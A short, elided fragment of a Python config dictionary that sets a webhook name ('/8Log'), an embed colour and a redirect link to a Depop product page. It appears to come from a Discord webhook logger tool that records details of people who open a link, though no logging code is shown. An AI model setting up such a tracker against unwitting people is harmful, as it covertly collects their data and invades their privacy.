...
config = {
    ...
    # CUSTOMIZATION #
    "username": "/8Log", # Set this to the name you want the webhook to have
    "color": 500, # Hex Color you want for the embed (Example: Red is 0xFF0000)
    ...
    "redirect": {
        ...
        "page": "https://www.depop.com/jhl_ivan/?brandIds=668&productId=612216768" # Link to the webpage to redirect to 
    },
